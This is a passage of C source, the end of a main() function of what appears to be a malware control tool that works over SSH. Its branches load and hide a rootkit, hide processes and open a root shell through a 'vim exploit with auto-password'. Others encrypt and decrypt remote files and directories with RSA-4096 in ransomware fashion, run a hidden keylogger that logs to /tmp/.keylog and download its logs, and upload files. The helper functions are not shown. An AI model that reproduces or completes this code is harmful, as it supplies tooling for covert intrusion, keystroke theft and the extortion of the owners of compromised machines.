            printf("[+] Rootkit loaded successfully via vim exploit with auto-password\n");
        }
        else if (load_rootkit_via_vim_script_auto_password(session, rootkit_vim_path) == 0) {
            printf("[+] Rootkit loaded successfully via vim script method with auto-password\n");
        }
        else {
            fprintf(stderr, "[-] All vim exploit methods with auto-password failed\n");
        }
    }
    
    if (hide_module_vim) {
        printf("[*] Hiding rootkit module using vim exploit with auto-password...\n");
        hide_module_with_vim_auto_password(session);
    }
    
    if (show_module_vim) {
        printf("[*] Showing rootkit module using vim exploit...\n");
        show_module_with_vim_auto_password(session);
    }
    
    if (hide_pid_vim) {
        printf("[*] Hiding process %d using vim exploit with auto-password...\n", pid_to_hide_vim);
        hide_pid_with_vim_auto_password(session, pid_to_hide_vim);
    }
    
    if (show_pid_vim) {
        printf("[*] Hiding process %d using vim exploit with auto-password...\n", pid_to_hide_vim);
        show_pid_with_vim_auto_password(session, pid_to_hide_vim);
    }
    
    if (encrypt_remote_file_path) {
        printf("[*] Encrypting remote file with RSA-4096: %s\n", encrypt_remote_file_path);
        encrypt_remote_file(session, encrypt_remote_file_path);
    }
    
    if (decrypt_remote_file_path) {
        printf("[*] Decrypting remote file with RSA-4096: %s\n", decrypt_remote_file_path);
        decrypt_remote_file(session, decrypt_remote_file_path);
    }
    
    if (encrypt_remote_dir_path) {
        printf("[*] Encrypting remote directory with RSA-4096: %s\n", encrypt_remote_dir_path);
        encrypt_remote_directory(session, encrypt_remote_dir_path);
    }
    
    if (decrypt_remote_dir_path) {
        printf("[*] Decrypting remote directory with RSA-4096: %s\n", decrypt_remote_dir_path);
        decrypt_remote_directory(session, decrypt_remote_dir_path);
    }
    
    if (start_keylog) {
        printf("[*] Starting remote keylogger...\n");
        start_remote_keylogger(&keylogger_data, session, "/tmp/.keylog");
    }
    
    if (stop_keylog) {
        printf("[*] Stopping remote keylogger...\n");
        stop_remote_keylogger(&keylogger_data);
    }
    
    if (download_logs_path) {
        printf("[*] Downloading keylogger logs to %s...\n", download_logs_path);
        if (!keylogger_data.session) {
            keylogger_data.session = session;
            strncpy(keylogger_data.logfile, "/tmp/.keylog", sizeof(keylogger_data.logfile) - 1);
            keylogger_data.logfile[sizeof(keylogger_data.logfile) - 1] = '\0';
        }
        
        if (download_keylogs(&keylogger_data, download_logs_path) != 0) {
            fprintf(stderr, "[-] Failed to download keylogger logs\n");
        }
    }
    
    if (local_path && remote_path) {
        printf("[*] Uploading %s to %s...\n", local_path, remote_path);
        upload_file(session, local_path, remote_path);
    }
    
    if (vim_root_shell) {
        printf("[*] Starting interactive root shell via vim exploit with auto-password...\n");
        interactive_vim_root_shell_auto_password(session);
    }
    
    if (interactive) {
        printf("[*] Starting interactive shell...\n");
        interactive_shell(session);
    }

    printf("[*] Disconnecting from %s...\n", target);
    cleanup_ssh_session(session);
    cleanup_rsa_keys(&global_rsa_keys);
    cleanup_password();
    
    EVP_cleanup();
    ERR_free_strings();
    
    printf("[+] Session closed\n");
    
    return 0;
}
